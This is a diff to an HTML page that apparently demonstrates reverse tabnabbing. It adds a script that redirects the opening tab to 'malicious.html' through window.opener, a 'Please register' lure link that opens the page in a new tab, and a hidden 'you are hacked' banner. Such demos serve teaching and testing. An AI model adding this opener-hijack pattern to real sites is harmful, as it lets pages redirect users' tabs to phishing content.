@@ -9,6 +9,11 @@
    #hax { display: none; font-family: Comic Sans MS; color: red; transform: rotate(-5deg); }
    #hax:target { display: block; }
 </style>
+<script>
+   if (window.opener) {
+      window.opener.location = "malicious.html";
+   }
+  </script>
 <h1 id="hax">OMG you are hacked 💩</h1>
 
-<a href="malicious.html" target="_blank"><b>Please Click ME because i contain very interesting information</b></a>
+<a href="malicious.html" target="_blank" onclick="window.open('malicious.html')">Please register</a>
